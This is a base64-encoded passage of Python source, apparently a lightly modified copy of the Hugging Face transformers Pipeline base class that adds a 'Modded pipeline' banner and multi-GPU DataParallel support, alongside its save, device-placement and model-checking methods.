ZWxzZToKICAgICAgICAgICAgICAgIHlpZWxkIGxpbmUKCiAgICBkZWYgc2F2ZShzZWxmLCBkYXRhOiBkaWN0KToKICAgICAgICAiIiIKICAgICAgICBQcmludCB0aGUgZGF0YS4KCiAgICAgICAgQXJnczoKICAgICAgICAgICAgZGF0YSAoYGRpY3RgKTogVGhlIGRhdGEgdG8gc3RvcmUuCiAgICAgICAgIiIiCiAgICAgICAgcHJpbnQoZGF0YSkKCiAgICBkZWYgc2F2ZV9iaW5hcnkoc2VsZiwgZGF0YTogVW5pb25bZGljdCwgTGlzdFtkaWN0XV0pIC0+IHN0cjoKICAgICAgICBpZiBzZWxmLm91dHB1dF9wYXRoIGlzIE5vbmU6CiAgICAgICAgICAgIHJhaXNlIEtleUVycm9yKAogICAgICAgICAgICAgICAgIldoZW4gdXNpbmcgcGlwZWQgaW5wdXQgb24gcGlwZWxpbmUgb3V0cHV0dGluZyBsYXJnZSBvYmplY3QgcmVxdWlyZXMgYW4gb3V0cHV0IGZpbGUgcGF0aC4gIgogICAgICAgICAgICAgICAgIlBsZWFzZSBwcm92aWRlIHN1Y2ggb3V0cHV0IHBhdGggdGhyb3VnaCAtLW91dHB1dCBhcmd1bWVudC4iCiAgICAgICAgICAgICkKCiAgICAgICAgcmV0dXJuIHN1cGVyKCkuc2F2ZV9iaW5hcnkoZGF0YSkKCgpjbGFzcyBfU2Npa2l0Q29tcGF0KEFCQyk6CiAgICAiIiIKICAgIEludGVyZmFjZSBsYXllciBmb3IgdGhlIFNjaWtpdCBhbmQgS2VyYXMgY29tcGF0aWJpbGl0eS4KICAgICIiIgoKICAgIEBhYnN0cmFjdG1ldGhvZAogICAgZGVmIHRyYW5zZm9ybShzZWxmLCBYKToKICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yKCkKCiAgICBAYWJzdHJhY3RtZXRob2QKICAgIGRlZiBwcmVkaWN0KHNlbGYsIFgpOgogICAgICAgIHJhaXNlIE5vdEltcGxlbWVudGVkRXJyb3IoKQoKClBJUEVMSU5FX0lOSVRfQVJHUyA9IHIiIiIKICAgIEFyZ3VtZW50czoKICAgICAgICBtb2RlbCAoW2BQcmVUcmFpbmVkTW9kZWxgXSBvciBbYFRGUHJlVHJhaW5lZE1vZGVsYF0pOgogICAgICAgICAgICBUaGUgbW9kZWwgdGhhdCB3aWxsIGJlIHVzZWQgYnkgdGhlIHBpcGVsaW5lIHRvIG1ha2UgcHJlZGljdGlvbnMuIFRoaXMgbmVlZHMgdG8gYmUgYSBtb2RlbCBpbmhlcml0aW5nIGZyb20KICAgICAgICAgICAgW2BQcmVUcmFpbmVkTW9kZWxgXSBmb3IgUHlUb3JjaCBhbmQgW2BURlByZVRyYWluZWRNb2RlbGBdIGZvciBUZW5zb3JGbG93LgogICAgICAgIHRva2VuaXplciAoW2BQcmVUcmFpbmVkVG9rZW5pemVyYF0pOgogICAgICAgICAgICBUaGUgdG9rZW5pemVyIHRoYXQgd2lsbCBiZSB1c2VkIGJ5IHRoZSBwaXBlbGluZSB0byBlbmNvZGUgZGF0YSBmb3IgdGhlIG1vZGVsLiBUaGlzIG9iamVjdCBpbmhlcml0cyBmcm9tCiAgICAgICAgICAgIFtgUHJlVHJhaW5lZFRva2VuaXplcmBdLgogICAgICAgIG1vZGVsY2FyZCAoYHN0cmAgb3IgW2BNb2RlbENhcmRgXSwgKm9wdGlvbmFsKik6CiAgICAgICAgICAgIE1vZGVsIGNhcmQgYXR0cmlidXRlZCB0byB0aGUgbW9kZWwgZm9yIHRoaXMgcGlwZWxpbmUuCiAgICAgICAgZnJhbWV3b3JrIChgc3RyYCwgKm9wdGlvbmFsKik6CiAgICAgICAgICAgIFRoZSBmcmFtZXdvcmsgdG8gdXNlLCBlaXRoZXIgYCJwdCJgIGZvciBQeVRvcmNoIG9yIGAidGYiYCBmb3IgVGVuc29yRmxvdy4gVGhlIHNwZWNpZmllZCBmcmFtZXdvcmsgbXVzdCBiZQogICAgICAgICAgICBpbnN0YWxsZWQuCgogICAgICAgICAgICBJZiBubyBmcmFtZXdvcmsgaXMgc3BlY2lmaWVkLCB3aWxsIGRlZmF1bHQgdG8gdGhlIG9uZSBjdXJyZW50bHkgaW5zdGFsbGVkLiBJZiBubyBmcmFtZXdvcmsgaXMgc3BlY2lmaWVkIGFuZAogICAgICAgICAgICBib3RoIGZyYW1ld29ya3MgYXJlIGluc3RhbGxlZCwgd2lsbCBkZWZhdWx0IHRvIHRoZSBmcmFtZXdvcmsgb2YgdGhlIGBtb2RlbGAsIG9yIHRvIFB5VG9yY2ggaWYgbm8gbW9kZWwgaXMKICAgICAgICAgICAgcHJvdmlkZWQuCiAgICAgICAgdGFzayAoYHN0cmAsIGRlZmF1bHRzIHRvIGAiImApOgogICAgICAgICAgICBBIHRhc2staWRlbnRpZmllciBmb3IgdGhlIHBpcGVsaW5lLgogICAgICAgIG51bV93b3JrZXJzIChgaW50YCwgKm9wdGlvbmFsKiwgZGVmYXVsdHMgdG8gOCk6CiAgICAgICAgICAgIFdoZW4gdGhlIHBpcGVsaW5lIHdpbGwgdXNlICpEYXRhTG9hZGVyKiAod2hlbiBwYXNzaW5nIGEgZGF0YXNldCwgb24gR1BVIGZvciBhIFB5dG9yY2ggbW9kZWwpLCB0aGUgbnVtYmVyIG9mCiAgICAgICAgICAgIHdvcmtlcnMgdG8gYmUgdXNlZC4KICAgICAgICBiYXRjaF9zaXplIChgaW50YCwgKm9wdGlvbmFsKiwgZGVmYXVsdHMgdG8gMSk6CiAgICAgICAgICAgIFdoZW4gdGhlIHBpcGVsaW5lIHdpbGwgdXNlICpEYXRhTG9hZGVyKiAod2hlbiBwYXNzaW5nIGEgZGF0YXNldCwgb24gR1BVIGZvciBhIFB5dG9yY2ggbW9kZWwpLCB0aGUgc2l6ZSBvZgogICAgICAgICAgICB0aGUgYmF0Y2ggdG8gdXNlLCBmb3IgaW5mZXJlbmNlIHRoaXMgaXMgbm90IGFsd2F5cyBiZW5lZmljaWFsLCBwbGVhc2UgcmVhZCBbQmF0Y2hpbmcgd2l0aAogICAgICAgICAgICBwaXBlbGluZXNdKGh0dHBzOi8vaHVnZ2luZ2ZhY2UuY28vdHJhbnNmb3JtZXJzL21haW5fY2xhc3Nlcy9waXBlbGluZXMuaHRtbCNwaXBlbGluZS1iYXRjaGluZykgLgogICAgICAgIGFyZ3NfcGFyc2VyIChbYH5waXBlbGluZXMuQXJndW1lbnRIYW5kbGVyYF0sICpvcHRpb25hbCopOgogICAgICAgICAgICBSZWZlcmVuY2UgdG8gdGhlIG9iamVjdCBpbiBjaGFyZ2Ugb2YgcGFyc2luZyBzdXBwbGllZCBwaXBlbGluZSBwYXJhbWV0ZXJzLgogICAgICAgIGRldmljZSAoYGludGAsICpvcHRpb25hbCosIGRlZmF1bHRzIHRvIC0xKToKICAgICAgICAgICAgRGV2aWNlIG9yZGluYWwgZm9yIENQVS9HUFUgc3VwcG9ydHMuIFNldHRpbmcgdGhpcyB0byAtMSB3aWxsIGxldmVyYWdlIENQVSwgYSBwb3NpdGl2ZSB3aWxsIHJ1biB0aGUgbW9kZWwgb24KICAgICAgICAgICAgdGhlIGFzc29jaWF0ZWQgQ1VEQSBkZXZpY2UgaWQuIFlvdSBjYW4gcGFzcyBuYXRpdmUgYHRvcmNoLmRldmljZWAgb3IgYSBgc3RyYCB0b28uCiAgICAgICAgYmluYXJ5X291dHB1dCAoYGJvb2xgLCAqb3B0aW9uYWwqLCBkZWZhdWx0cyB0byBgRmFsc2VgKToKICAgICAgICAgICAgRmxhZyBpbmRpY2F0aW5nIGlmIHRoZSBvdXRwdXQgdGhlIHBpcGVsaW5lIHNob3VsZCBoYXBwZW4gaW4gYSBiaW5hcnkgZm9ybWF0IChpLmUuLCBwaWNrbGUpIG9yIGFzIHJhdyB0ZXh0LgoiIiIKCmlmIGlzX3RvcmNoX2F2YWlsYWJsZSgpOgogICAgZnJvbSB0cmFuc2Zvcm1lcnMucGlwZWxpbmVzLnB0X3V0aWxzIGltcG9ydCAoCiAgICAgICAgUGlwZWxpbmVDaHVua0l0ZXJhdG9yLAogICAgICAgIFBpcGVsaW5lRGF0YXNldCwKICAgICAgICBQaXBlbGluZUl0ZXJhdG9yLAogICAgICAgIFBpcGVsaW5lUGFja0l0ZXJhdG9yLAogICAgKQoKCkBhZGRfZW5kX2RvY3N0cmluZ3MoUElQRUxJTkVfSU5JVF9BUkdTKQpjbGFzcyBQaXBlbGluZShfU2Npa2l0Q29tcGF0KToKICAgIHByaW50KCdNb2RkZWQgcGlwZWxpbmUgYnkgUXVpY2tzdGlja3M6IGh0dHBzOi8vZ2l0aHViLmNvbS9RdWlja3N0aWNrcy1vc3MnKQogICAgcHJpbnQoJ1ZlcnNpb246IHYxLjEnKQogICAgcHJpbnQoKQoKICAgIGRlZmF1bHRfaW5wdXRfbmFtZXMgPSBOb25lCgogICAgZGVmIF9faW5pdF9fKAogICAgICAgIHNlbGYsCiAgICAgICAgbW9kZWw6IFVuaW9uWyJQcmVUcmFpbmVkTW9kZWwiLCAiVEZQcmVUcmFpbmVkTW9kZWwiXSwKICAgICAgICB0b2tlbml6ZXI6IE9wdGlvbmFsW1ByZVRyYWluZWRUb2tlbml6ZXJdID0gTm9uZSwKICAgICAgICBmZWF0dXJlX2V4dHJhY3RvcjogT3B0aW9uYWxbUHJlVHJhaW5lZEZlYXR1cmVFeHRyYWN0b3JdID0gTm9uZSwKICAgICAgICBtb2RlbGNhcmQ6IE9wdGlvbmFsW01vZGVsQ2FyZF0gPSBOb25lLAogICAgICAgIGZyYW1ld29yazogT3B0aW9uYWxbc3RyXSA9IE5vbmUsCiAgICAgICAgdGFzazogc3RyID0gIiIsCiAgICAgICAgYXJnc19wYXJzZXI6IEFyZ3VtZW50SGFuZGxlciA9IE5vbmUsCiAgICAgICAgZGV2aWNlOiBVbmlvbltpbnQsIHN0ciwgInRvcmNoLmRldmljZSJdID0gLTEsCiAgICAgICAgYmluYXJ5X291dHB1dDogYm9vbCA9IEZhbHNlLAogICAgICAgICoqa3dhcmdzLAogICAgKToKICAgICAgICBpZiBmcmFtZXdvcmsgaXMgTm9uZToKICAgICAgICAgICAgZnJhbWV3b3JrLCBtb2RlbCA9IGluZmVyX2ZyYW1ld29ya19sb2FkX21vZGVsKG1vZGVsLCBjb25maWc9bW9kZWwuY29uZmlnKQoKICAgICAgICBzZWxmLnRhc2sgPSB0YXNrCiAgICAgICAgc2VsZi5tb2RlbCA9IG1vZGVsCiAgICAgICAgc2VsZi50b2tlbml6ZXIgPSB0b2tlbml6ZXIKICAgICAgICBzZWxmLmZlYXR1cmVfZXh0cmFjdG9yID0gZmVhdHVyZV9leHRyYWN0b3IKICAgICAgICBzZWxmLm1vZGVsY2FyZCA9IG1vZGVsY2FyZAogICAgICAgIHNlbGYuZnJhbWV3b3JrID0gZnJhbWV3b3JrCgogICAgICAgIGRldmljZXMgPSBbaSBmb3IgaSBpbiByYW5nZSh0b3JjaC5jdWRhLmRldmljZV9jb3VudCgpKV0KCiAgICAgICAgaWYgbGVuKGRldmljZXMpID4gMDoKICAgICAgICAgICAgcHJpbnQoJ0RldmljZXMgbGlzdDonLCBkZXZpY2VzKQoKICAgICAgICAgICAgc2VsZi5kZXZpY2UgPSB0b3JjaC5kZXZpY2UoImN1ZGE6MCIpCiAgICAgICAgICAgIG1vZGVsID0gbm4uRGF0YVBhcmFsbGVsKG1vZGVsLCBkZXZpY2VfaWRzID0gZGV2aWNlcykKICAgICAgICAgICAgcHJpbnQoJ1VzaW5nOiBEYXRhUGFyYWxsZWwnKQogICAgICAgICAgICBwcmludCgnTXVsdGkgR1BVOiBlbmFibGVkJykKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLmRldmljZSA9IHRvcmNoLmRldmljZSgiY3B1IikKICAgICAgICAgICAgcHJpbnQoJ0NvdWxkIG5vdCBkZXRlY3QgR1BVIHVzaW5nIENQVS4nKQoKICAgICAgICBwcmludCgpCgogICAgICAgIHNlbGYuYmluYXJ5X291dHB1dCA9IGJpbmFyeV9vdXRwdXQKCiAgICAgICAgIyBTcGVjaWFsIGhhbmRsaW5nCiAgICAgICAgaWYgc2VsZi5mcmFtZXdvcmsgPT0gInB0IiBhbmQgc2VsZi5kZXZpY2UudHlwZSAhPSAiY3B1IjoKICAgICAgICAgICAgc2VsZi5tb2RlbCA9IHNlbGYubW9kZWwudG8oc2VsZi5kZXZpY2UpCgogICAgICAgICMgVXBkYXRlIGNvbmZpZyB3aXRoIHRhc2sgc3BlY2lmaWMgcGFyYW1ldGVycwogICAgICAgIHRhc2tfc3BlY2lmaWNfcGFyYW1zID0gc2VsZi5tb2RlbC5jb25maWcudGFza19zcGVjaWZpY19wYXJhbXMKICAgICAgICBpZiB0YXNrX3NwZWNpZmljX3BhcmFtcyBpcyBub3QgTm9uZSBhbmQgdGFzayBpbiB0YXNrX3NwZWNpZmljX3BhcmFtczoKICAgICAgICAgICAgc2VsZi5tb2RlbC5jb25maWcudXBkYXRlKHRhc2tfc3BlY2lmaWNfcGFyYW1zLmdldCh0YXNrKSkKCiAgICAgICAgc2VsZi5jYWxsX2NvdW50ID0gMAogICAgICAgIHNlbGYuX2JhdGNoX3NpemUgPSBrd2FyZ3MucG9wKCJiYXRjaF9zaXplIiwgTm9uZSkKICAgICAgICBzZWxmLl9udW1fd29ya2VycyA9IGt3YXJncy5wb3AoIm51bV93b3JrZXJzIiwgTm9uZSkKICAgICAgICBzZWxmLl9wcmVwcm9jZXNzX3BhcmFtcywgc2VsZi5fZm9yd2FyZF9wYXJhbXMsIHNlbGYuX3Bvc3Rwcm9jZXNzX3BhcmFtcyA9IHNlbGYuX3Nhbml0aXplX3BhcmFtZXRlcnMoKiprd2FyZ3MpCgogICAgZGVmIHNhdmVfcHJldHJhaW5lZChzZWxmLCBzYXZlX2RpcmVjdG9yeTogc3RyKToKICAgICAgICAiIiIKICAgICAgICBTYXZlIHRoZSBwaXBlbGluZSdzIG1vZGVsIGFuZCB0b2tlbml6ZXIuCgogICAgICAgIEFyZ3M6CiAgICAgICAgICAgIHNhdmVfZGlyZWN0b3J5IChgc3RyYCk6CiAgICAgICAgICAgICAgICBBIHBhdGggdG8gdGhlIGRpcmVjdG9yeSB3aGVyZSB0byBzYXZlZC4gSXQgd2lsbCBiZSBjcmVhdGVkIGlmIGl0IGRvZXNuJ3QgZXhpc3QuCiAgICAgICAgIiIiCiAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUoc2F2ZV9kaXJlY3RvcnkpOgogICAgICAgICAgICBsb2dnZXIuZXJyb3IoZiJQcm92aWRlZCBwYXRoICh7c2F2ZV9kaXJlY3Rvcnl9KSBzaG91bGQgYmUgYSBkaXJlY3RvcnksIG5vdCBhIGZpbGUiKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBvcy5tYWtlZGlycyhzYXZlX2RpcmVjdG9yeSwgZXhpc3Rfb2s9VHJ1ZSkKCiAgICAgICAgaWYgaGFzYXR0cihzZWxmLCAiX3JlZ2lzdGVyZWRfaW1wbCIpOgogICAgICAgICAgICAjIEFkZCBpbmZvIHRvIHRoZSBjb25maWcKICAgICAgICAgICAgcGlwZWxpbmVfaW5mbyA9IHNlbGYuX3JlZ2lzdGVyZWRfaW1wbC5jb3B5KCkKICAgICAgICAgICAgY3VzdG9tX3BpcGVsaW5lcyA9IHt9CiAgICAgICAgICAgIGZvciB0YXNrLCBpbmZvIGluIHBpcGVsaW5lX2luZm8uaXRlbXMoKToKICAgICAgICAgICAgICAgIGlmIGluZm9bImltcGwiXSAhPSBzZWxmLl9fY2xhc3NfXzoKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgICAgIGluZm8gPSBpbmZvLmNvcHkoKQogICAgICAgICAgICAgICAgbW9kdWxlX25hbWUgPSBpbmZvWyJpbXBsIl0uX19tb2R1bGVfXwogICAgICAgICAgICAgICAgbGFzdF9tb2R1bGUgPSBtb2R1bGVfbmFtZS5zcGxpdCgiLiIpWy0xXQogICAgICAgICAgICAgICAgIyBDaGFuZ2UgY2xhc3NlcyBpbnRvIHRoZWlyIG5hbWVzL2Z1bGwgbmFtZXMKICAgICAgICAgICAgICAgIGluZm9bImltcGwiXSA9IGYie2xhc3RfbW9kdWxlfS57aW5mb1snaW1wbCddLl9fbmFtZV9ffSIKICAgICAgICAgICAgICAgIGluZm9bInB0Il0gPSB0dXBsZShjLl9fbmFtZV9fIGZvciBjIGluIGluZm9bInB0Il0pCiAgICAgICAgICAgICAgICBpbmZvWyJ0ZiJdID0gdHVwbGUoYy5fX25hbWVfXyBmb3IgYyBpbiBpbmZvWyJ0ZiJdKQoKICAgICAgICAgICAgICAgIGN1c3RvbV9waXBlbGluZXNbdGFza10gPSBpbmZvCiAgICAgICAgICAgIHNlbGYubW9kZWwuY29uZmlnLmN1c3RvbV9waXBlbGluZXMgPSBjdXN0b21fcGlwZWxpbmVzCiAgICAgICAgICAgICMgU2F2ZSB0aGUgcGlwZWxpbmUgY3VzdG9tIGNvZGUKICAgICAgICAgICAgY3VzdG9tX29iamVjdF9zYXZlKHNlbGYsIHNhdmVfZGlyZWN0b3J5KQoKICAgICAgICBzZWxmLm1vZGVsLnNhdmVfcHJldHJhaW5lZChzYXZlX2RpcmVjdG9yeSkKCiAgICAgICAgaWYgc2VsZi50b2tlbml6ZXIgaXMgbm90IE5vbmU6CiAgICAgICAgICAgIHNlbGYudG9rZW5pemVyLnNhdmVfcHJldHJhaW5lZChzYXZlX2RpcmVjdG9yeSkKCiAgICAgICAgaWYgc2VsZi5mZWF0dXJlX2V4dHJhY3RvciBpcyBub3QgTm9uZToKICAgICAgICAgICAgc2VsZi5mZWF0dXJlX2V4dHJhY3Rvci5zYXZlX3ByZXRyYWluZWQoc2F2ZV9kaXJlY3RvcnkpCgogICAgICAgIGlmIHNlbGYubW9kZWxjYXJkIGlzIG5vdCBOb25lOgogICAgICAgICAgICBzZWxmLm1vZGVsY2FyZC5zYXZlX3ByZXRyYWluZWQoc2F2ZV9kaXJlY3RvcnkpCgogICAgZGVmIHRyYW5zZm9ybShzZWxmLCBYKToKICAgICAgICAiIiIKICAgICAgICBTY2lraXQgLyBLZXJhcyBpbnRlcmZhY2UgdG8gdHJhbnNmb3JtZXJzJyBwaXBlbGluZXMuIFRoaXMgbWV0aG9kIHdpbGwgZm9yd2FyZCB0byBfX2NhbGxfXygpLgogICAgICAgICIiIgogICAgICAgIHJldHVybiBzZWxmKFg9WCkKCiAgICBkZWYgcHJlZGljdChzZWxmLCBYKToKICAgICAgICAiIiIKICAgICAgICBTY2lraXQgLyBLZXJhcyBpbnRlcmZhY2UgdG8gdHJhbnNmb3JtZXJzJyBwaXBlbGluZXMuIFRoaXMgbWV0aG9kIHdpbGwgZm9yd2FyZCB0byBfX2NhbGxfXygpLgogICAgICAgICIiIgogICAgICAgIHJldHVybiBzZWxmKFg9WCkKCiAgICBAY29udGV4dG1hbmFnZXIKICAgIGRlZiBkZXZpY2VfcGxhY2VtZW50KHNlbGYpOgogICAgICAgICIiIgogICAgICAgIENvbnRleHQgTWFuYWdlciBhbGxvd2luZyB0ZW5zb3IgYWxsb2NhdGlvbiBvbiB0aGUgdXNlci1zcGVjaWZpZWQgZGV2aWNlIGluIGZyYW1ld29yayBhZ25vc3RpYyB3YXkuCgogICAgICAgIFJldHVybnM6CiAgICAgICAgICAgIENvbnRleHQgbWFuYWdlcgoKICAgICAgICBFeGFtcGxlczoKCiAgICAgICAgYGBgcHl0aG9uCiAgICAgICAgIyBFeHBsaWNpdGx5IGFzayBmb3IgdGVuc29yIGFsbG9jYXRpb24gb24gQ1VEQSBkZXZpY2UgOjAKICAgICAgICBwaXBlID0gcGlwZWxpbmUoLi4uLCBkZXZpY2U9MCkKICAgICAgICB3aXRoIHBpcGUuZGV2aWNlX3BsYWNlbWVudCgpOgogICAgICAgICAgICAjIEV2ZXJ5IGZyYW1ld29yayBzcGVjaWZpYyB0ZW5zb3IgYWxsb2NhdGlvbiB3aWxsIGJlIGRvbmUgb24gdGhlIHJlcXVlc3QgZGV2aWNlCiAgICAgICAgICAgIG91dHB1dCA9IHBpcGUoLi4uKQogICAgICAgIGBgYCIiIgogICAgICAgIGlmIHNlbGYuZnJhbWV3b3JrID09ICJ0ZiI6CiAgICAgICAgICAgIHdpdGggdGYuZGV2aWNlKCIvQ1BVOjAiIGlmIHNlbGYuZGV2aWNlID09IC0xIGVsc2UgZiIvZGV2aWNlOkdQVTp7c2VsZi5kZXZpY2V9Iik6CiAgICAgICAgICAgICAgICB5aWVsZAogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGlmIHNlbGYuZGV2aWNlLnR5cGUgPT0gImN1ZGEiOgogICAgICAgICAgICAgICAgdG9yY2guY3VkYS5zZXRfZGV2aWNlKHNlbGYuZGV2aWNlKQoKICAgICAgICAgICAgeWllbGQKCiAgICBkZWYgZW5zdXJlX3RlbnNvcl9vbl9kZXZpY2Uoc2VsZiwgKippbnB1dHMpOgogICAgICAgICIiIgogICAgICAgIEVuc3VyZSBQeVRvcmNoIHRlbnNvcnMgYXJlIG9uIHRoZSBzcGVjaWZpZWQgZGV2aWNlLgoKICAgICAgICBBcmdzOgogICAgICAgICAgICBpbnB1dHMgKGtleXdvcmQgYXJndW1lbnRzIHRoYXQgc2hvdWxkIGJlIGB0b3JjaC5UZW5zb3JgLCB0aGUgcmVzdCBpcyBpZ25vcmVkKToKICAgICAgICAgICAgICAgIFRoZSB0ZW5zb3JzIHRvIHBsYWNlIG9uIGBzZWxmLmRldmljZWAuCiAgICAgICAgICAgIFJlY3Vyc2l2ZSBvbiBsaXN0cyAqKm9ubHkqKi4KCiAgICAgICAgUmV0dXJuOgogICAgICAgICAgICBgRGljdFtzdHIsIHRvcmNoLlRlbnNvcl1gOiBUaGUgc2FtZSBhcyBgaW5wdXRzYCBidXQgb24gdGhlIHByb3BlciBkZXZpY2UuCiAgICAgICAgIiIiCiAgICAgICAgcmV0dXJuIHNlbGYuX2Vuc3VyZV90ZW5zb3Jfb25fZGV2aWNlKGlucHV0cywgc2VsZi5kZXZpY2UpCgogICAgZGVmIF9lbnN1cmVfdGVuc29yX29uX2RldmljZShzZWxmLCBpbnB1dHMsIGRldmljZSk6CiAgICAgICAgaWYgaXNpbnN0YW5jZShpbnB1dHMsIE1vZGVsT3V0cHV0KToKICAgICAgICAgICAgcmV0dXJuIE1vZGVsT3V0cHV0KAogICAgICAgICAgICAgICAge25hbWU6IHNlbGYuX2Vuc3VyZV90ZW5zb3Jfb25fZGV2aWNlKHRlbnNvciwgZGV2aWNlKSBmb3IgbmFtZSwgdGVuc29yIGluIGlucHV0cy5pdGVtcygpfQogICAgICAgICAgICApCiAgICAgICAgZWxpZiBpc2luc3RhbmNlKGlucHV0cywgZGljdCk6CiAgICAgICAgICAgIHJldHVybiB7bmFtZTogc2VsZi5fZW5zdXJlX3RlbnNvcl9vbl9kZXZpY2UodGVuc29yLCBkZXZpY2UpIGZvciBuYW1lLCB0ZW5zb3IgaW4gaW5wdXRzLml0ZW1zKCl9CiAgICAgICAgZWxpZiBpc2luc3RhbmNlKGlucHV0cywgVXNlckRpY3QpOgogICAgICAgICAgICByZXR1cm4gVXNlckRpY3Qoe25hbWU6IHNlbGYuX2Vuc3VyZV90ZW5zb3Jfb25fZGV2aWNlKHRlbnNvciwgZGV2aWNlKSBmb3IgbmFtZSwgdGVuc29yIGluIGlucHV0cy5pdGVtcygpfSkKICAgICAgICBlbGlmIGlzaW5zdGFuY2UoaW5wdXRzLCBsaXN0KToKICAgICAgICAgICAgcmV0dXJuIFtzZWxmLl9lbnN1cmVfdGVuc29yX29uX2RldmljZShpdGVtLCBkZXZpY2UpIGZvciBpdGVtIGluIGlucHV0c10KICAgICAgICBlbGlmIGlzaW5zdGFuY2UoaW5wdXRzLCB0dXBsZSk6CiAgICAgICAgICAgIHJldHVybiB0dXBsZShbc2VsZi5fZW5zdXJlX3RlbnNvcl9vbl9kZXZpY2UoaXRlbSwgZGV2aWNlKSBmb3IgaXRlbSBpbiBpbnB1dHNdKQogICAgICAgIGVsaWYgaXNpbnN0YW5jZShpbnB1dHMsIHRvcmNoLlRlbnNvcik6CiAgICAgICAgICAgIGlmIGRldmljZSA9PSB0b3JjaC5kZXZpY2UoImNwdSIpIGFuZCBpbnB1dHMuZHR5cGUgaW4ge3RvcmNoLmZsb2F0MTYsIHRvcmNoLmJmbG9hdDE2fToKICAgICAgICAgICAgICAgIGlucHV0cyA9IGlucHV0cy5mbG9hdCgpCiAgICAgICAgICAgIHJldHVybiBpbnB1dHMudG8oZGV2aWNlKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiBpbnB1dHMKCiAgICBkZWYgY2hlY2tfbW9kZWxfdHlwZShzZWxmLCBzdXBwb3J0ZWRfbW9kZWxzOiBVbmlvbltMaXN0W3N0cl0sIGRpY3RdKToKICAgICAgICAiIiIKICAgICAgICBDaGVjayBpZiB0aGUgbW9kZWwgY2xhc3MgaXMgaW4gc3VwcG9ydGVkIGJ5IHRoZSBwaXBlbGluZS4KCiAgICAgICAgQXJnczoKICAgICAgICAgICAgc3VwcG9ydGVkX21vZGVscyAoYExpc3Rbc3RyXWAgb3IgYGRpY3RgKToKICAgICAgICAgICAgICAgIFRoZSBsaXN0IG9mIG1vZGVscyBzdXBwb3J0ZWQgYnkgdGhlIHBpcGVsaW5lLCBvciBhIGRpY3Rpb25hcnkgd2l0aCBtb2RlbCBjbGFzcyB2YWx1ZXMuCiAgICAgICAgIiIiCiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uoc3VwcG9ydGVkX21vZGVscywgbGlzdCk6ICAjIENyZWF0ZSBmcm9tIGEgbW9kZWwgbWFwcGluZwogICAgICAgICAgICBzdXBwb3J0ZWRfbW9kZWxzX25hbWVzID0gW10KICAgICAgICAgICAgZm9yIGNvbmZpZywgbW9kZWwgaW4gc3VwcG9ydGVkX21vZGVscy5pdGVtcygpOgogICAgICAgICAgICAgICAgIyBNYXBwaW5nIGNhbiBub3cgY29udGFpbiB0dXBsZXMgb2YgbW9kZWxzIGZvciB0aGUgc2FtZSBjb25maWd1cmF0aW9uLgogICAgICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShtb2RlbCwgdHVwbGUpOgogICAgICAgICAgICAgICAgICAgIHN1cHBvcnRlZF9tb2RlbHNfbmFtZXMuZXh0ZW5kKFtfbW9kZWwuX19uYW1lX18gZm9yIF9tb2RlbCBpbiBtb2RlbF0pCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHN1cHBvcnRlZF9tb2RlbHNfbmFtZXMuYXBwZW5kKG1vZGVsLl9fbmFtZV9fKQogICAgICAgICAgICBzdXBwb3J0ZWRfbW9kZWxzID0gc3VwcG9ydGVkX21vZGVsc19uYW1lcwogICAgICAgIGlmIHNlbGYubW9kZWwuX19jbGFzc19fLl9fbmFtZV9fIG5vdCBpbiBzdXBwb3J0ZWRfbW9kZWxzOgogICAgICAgICAgICBsb2dnZXIuZXJyb3IoCiAgICAgICAgICAgICAgICBmIlRoZSBtb2RlbCAne3NlbGYubW9kZWwuX19jbGFzc19fLl9fbmFtZV9ffScgaXMgbm90IHN1cHBvcnRlZCBmb3Ige3NlbGYudGFza30uIFN1cHBvcnRlZCBtb2RlbHMgYXJlIgogICAgICAgICAgICAgICAgZiIge3N1cHBvcnRlZF9tb2RlbHN9LiIKICAgICAgICAgICAgKQoKICAgIEBhYnN0cmFjdG1ldGhvZAogICAgZGVmIF9zYW5pdGl6ZV9wYXJhbWV0ZXJzKHNlbGYsICoqcGlwZWxpbmVfcGFyYW1ldGVycyk6CiAgICAgICAgIiIiCiAgICAgICAgX3Nhbml0aXplX3BhcmFtZXRlcnMgd2lsbCBiZSBjYWxsZWQgd2l0aCBhbnkgZXhjZXNzaXZlIG5hbWVkIGFyZ3VtZW50cyBmcm9tIGVpdGhlciBgX19pbml0X19gIG9yIGBfX2NhbGxfX2AKICAgICAgICBtZXRob2RzLiBJdCBzaG91bGQgcmV0dXJuIDMgZGljdGlvbm5hcmllcyBvZiB0aGUgcmVzb2x2ZWQgcGFyYW1ldGVycyB1c2VkIGJ5IHRoZSB2YXJpb3VzIGBwcmVwcm9jZXNzYCwKICAgICAgICBgZm9yd2FyZGAgYW5kIGBwb3N0cHJvY2Vzc2AgbWV0aG9kcy4gRG8gbm90IGZpbGwgZGljdGlvbm5hcmllcyBpZiB0aGUgY2FsbGVyIGRpZG4ndCBzcGVjaWZ5IGEga3dhcmdzLiBUaGlzCiAgICAgICAgbGV0J3MgeW91IGtlZXAgZGVmYXVsdHMgaW4gZnVuY3Rpb24gc2lnbmF0dXJlcywgd2hpY2ggaXMgbW9yZSAibmF0dXJhbCIuCgogICAgICAgIEl0IGlzIG5vdCBtZWFudCB0byBiZSBjYWxsZWQgZGlyZWN0bHksIGl0IHdpbGwgYmUgYXV0b21hdGljYWxseSBjYWxsZWQgYW5kIHRoZSBmaW5hbCBwYXJhbWV0ZXJzIHJlc29sdmVkIGJ5CiAgICAgICAgYF9faW5pdF9fYCBhbmQgYF9fY2FsbF9fYAogICAgICAgICIiIgogICAgICAgIHJhaXNlIE5vdEltcGxlbWVudGVkRXJyb3IoIl9zYW5pdGl6ZV9wYXJhbWV0ZXJzIG5vdCBpbXBsZW1lbnRlZCIpCgogICAgQGFic3RyYWN0bWV0aG9kCiAgICBkZWYgcHJlcHJvY2VzcyhzZWxmLCBpbnB1dF86IEFueSwgKipwcmVwcm9jZXNzX3BhcmFtZXRlcnM6IERpY3QpIC0+IERpY3Rbc3RyLCBHZW5lcmljVGVuc29yXToKICAgICAg